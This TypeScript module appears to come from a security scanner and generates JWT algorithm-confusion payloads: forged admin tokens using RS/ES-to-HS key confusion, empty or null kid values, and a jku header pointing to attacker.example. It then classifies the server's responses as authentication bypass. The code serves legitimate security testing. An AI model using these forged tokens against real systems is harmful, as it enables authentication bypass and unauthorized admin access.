// Adapted from source-reference/vantix/secops/skills/ patterns.
// Rewritten in TypeScript. No runtime dependency on the vendored source.
import type { FamilyMetadata, OracleClassification, PayloadVariant, ProbeContext, ScannerResponseInput } from '../types';

export const META: FamilyMetadata = {
  id: 'jwt-key-confusion',
  family: 'jwt-attack',
  title: 'JWT RS→HS256 algorithm key confusion',
  severity: 'critical',
  destructiveRisk: 'none',
  requiresOast: false,
  requiresBrowser: false,
  insertionPointKinds: ['header', 'cookie'],
  expectedSignals: ['auth-bypass', 'status-delta'],
  cwe: [327, 345],
};

function b64url(s: string): string {
  return Buffer.from(s).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

// Simulated key-confusion payloads. In a real probe run the engine would
// fetch the server's public key and use it as the HMAC secret.  Here we
// emit realistic placeholder tokens that encode the attack intent so the
// probe runner can substitute the real public-key bytes.
const CONFUSION_VARIANTS = [
  {
    id: 'jwt-kc-hs256-pubkey',
    intent: 'HS256 signed with server RSA public key as HMAC secret (classic CVE attack)',
    algFrom: 'RS256',
    algTo: 'HS256',
    note: '__PF_PUBKEY_BYTES__',
  },
  {
    id: 'jwt-kc-hs384-pubkey',
    intent: 'HS384 signed with server public key — variant for HS384 servers',
    algFrom: 'RS384',
    algTo: 'HS384',
    note: '__PF_PUBKEY_BYTES__',
  },
  {
    id: 'jwt-kc-hs512-pubkey',
    intent: 'HS512 signed with server public key — variant for HS512 servers',
    algFrom: 'RS512',
    algTo: 'HS512',
    note: '__PF_PUBKEY_BYTES__',
  },
  {
    id: 'jwt-kc-ec-to-hs',
    intent: 'ES256→HS256 confusion: EC public key bytes used as HMAC secret',
    algFrom: 'ES256',
    algTo: 'HS256',
    note: '__PF_ECPUBKEY_BYTES__',
  },
  {
    id: 'jwt-kc-empty-kid',
    intent: 'kid="" (empty) to select empty HMAC key on misconfigured libs',
    algFrom: 'RS256',
    algTo: 'HS256',
    note: '__PF_EMPTY_KID__',
  },
  {
    id: 'jwt-kc-null-kid',
    intent: 'kid=null injection to coerce key lookup fallback',
    algFrom: 'RS256',
    algTo: 'HS256',
    note: '__PF_NULL_KID__',
  },
  {
    id: 'jwt-kc-jwks-inject',
    intent: 'jku/x5u pointing to attacker-controlled JWKS endpoint (SSRF + key inject)',
    algFrom: 'RS256',
    algTo: 'RS256',
    note: '__PF_OAST_JWKS_URL__',
  },
];

const BASE_PAYLOAD = { sub: '1', role: 'admin', iat: 1700000000, exp: 9999999999 };

export function variants(_ctx: ProbeContext): PayloadVariant[] {
  return CONFUSION_VARIANTS.map((v) => {
    const headerObj: Record<string, unknown> = { alg: v.algTo, typ: 'JWT' };
    if (v.note === '__PF_EMPTY_KID__') headerObj['kid'] = '';
    if (v.note === '__PF_NULL_KID__') headerObj['kid'] = null;
    if (v.note === '__PF_OAST_JWKS_URL__') headerObj['jku'] = 'https://attacker.example/jwks.json';

    const header = b64url(JSON.stringify(headerObj));
    const body = b64url(JSON.stringify(BASE_PAYLOAD));
    // Signature placeholder — probe runner replaces with actual HMAC bytes.
    const sig = b64url(v.note);
    const token = `${header}.${body}.${sig}`;

    return {
      id: v.id,
      family: 'jwt-attack' as const,
      value: token,
      encoding: 'raw' as const,
      intent: v.intent,
      destructiveRisk: 'none' as const,
      expectedSignals: ['auth-bypass', 'status-delta'],
    };
  });
}

export function classify(
  resp: ScannerResponseInput,
  variant: PayloadVariant,
  baseline: ScannerResponseInput,
): OracleClassification {
  const evidence: string[] = [];
  let responseClass: OracleClassification['responseClass'] = 'neutral-or-not-parsed';
  let confidence = 0.1;
  let nextAction: OracleClassification['nextAction'] = 'continue';

  const wasUnauth = baseline.statusCode === 401 || baseline.statusCode === 403;
  const nowAuthed = resp.statusCode >= 200 && resp.statusCode < 300;

  if (wasUnauth && nowAuthed) {
    responseClass = 'expected-proof';
    confidence = 0.95;
    nextAction = 'promote-finding';
    evidence.push(`Key confusion bypass: ${baseline.statusCode}→${resp.statusCode} with ${variant.id}`);
  } else if (variant.id === 'jwt-kc-jwks-inject' && resp.statusCode >= 200 && resp.statusCode < 400) {
    responseClass = 'observed-value';
    confidence = 0.7;
    nextAction = 'confirm';
    evidence.push('JWKS URL injection accepted — check OAST for outbound fetch');
  } else if (baseline.statusCode !== resp.statusCode) {
    responseClass = 'status-delta';
    confidence = 0.4;
    nextAction = 'continue';
    evidence.push(`Status delta ${baseline.statusCode}→${resp.statusCode}`);
  } else {
    nextAction = 'stop-negative';
    evidence.push('No confusion signal detected');
  }

  return { payloadVariantId: variant.id, responseClass, confidence, evidence, nextAction };
}
